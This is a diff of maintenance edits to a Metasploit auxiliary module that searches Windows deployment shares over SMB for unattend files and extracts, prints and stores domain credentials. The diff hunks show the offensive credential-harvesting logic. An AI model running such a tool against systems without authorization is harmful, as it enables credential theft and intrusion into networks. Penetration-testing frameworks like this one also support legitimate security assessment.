@@ -1,14 +1,10 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex/proto/dcerpc'
-require 'rex/parser/unattend'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Exploit::Remote::DCERPC
@@ -22,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
           This module will search remote file shares for unattended installation files that may contain
           domain credentials. This is often used after discovering domain credentials with the
-          auxilliary/scanner/dcerpc/windows_deployment_services module or in cases where you already
+          auxiliary/scanner/dcerpc/windows_deployment_services module or in cases where you already
           have domain credentials. This module will connect to the RemInst share and any Microsoft
           Deployment Toolkit shares indicated by the share name comments.
       },
@@ -31,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
       'References'     =>
         [
           [ 'MSDN', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
-          [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html'],
+          [ 'URL', 'http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html'],
         ],
       ))
 
@@ -39,9 +35,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(445),
         OptString.new('SMBDomain', [ false, "SMB Domain", '']),
-      ], self.class)
+      ])
 
-    deregister_options('RHOST', 'CHOST', 'CPORT', 'SSL', 'SSLVersion')
   end
 
   # Determine the type of share based on an ID type value
@@ -60,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
     begin
       dcerpc_bind(handle)
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
-      print_error("#{rhost} : #{e.message}")
+      print_error(e.message)
       return
     end
 
@@ -139,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
     deploy_shares = []
 
     begin
-      connect
+      connect(versions: [1])
       smb_login
       srvsvc_netshareenum.each do |share|
         # Ghetto unicode to ascii conversation
@@ -148,7 +143,7 @@ class Metasploit3 < Msf::Auxiliary
         share_type = share[1]
 
         if share_type == "DISK" && (share_name == "REMINST" || share_comm == "MDT Deployment Share")
-          vprint_good("#{ip}:#{rport} Identified deployment share #{share_name} #{share_comm}")
+          vprint_good("Identified deployment share #{share_name} #{share_comm}")
           deploy_shares << share_name
         end
       end
@@ -164,12 +159,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def query_share(share)
     share_path = "\\\\#{rhost}\\#{share}"
-    vprint_status("#{rhost}:#{rport} Enumerating #{share}...")
+    vprint_status("Enumerating #{share}...")
 
     begin
       simple.connect(share_path)
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
-      print_error("#{rhost}:#{rport} Could not access share: #{share} - #{e}")
+      print_error("Could not access share: #{share} - #{e}")
       return
     end
 
@@ -188,7 +183,7 @@ class Metasploit3 < Msf::Auxiliary
         next unless cred['password'].to_s.length > 0
 
         report_creds(cred['domain'].to_s, cred['username'], cred['password'])
-        print_good("#{rhost}:#{rport} Credentials: " +
+        print_good("Credentials: " +
           "Path=#{share_path}#{file_path} " +
           "Username=#{cred['domain'].to_s}\\#{cred['username'].to_s} " +
           "Password=#{cred['password'].to_s}"
@@ -238,7 +233,7 @@ class Metasploit3 < Msf::Auxiliary
   def loot_unattend(data)
     return if data.empty?
     path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
-    print_status("#{rhost}:#{rport} Stored unattend.xml in #{path}")
+    print_good("Stored unattend.xml in #{path}")
   end
 
   def report_creds(domain, user, pass)
@@ -251,6 +246,5 @@ class Metasploit3 < Msf::Auxiliary
       proof: domain
     )
   end
-
 end
 
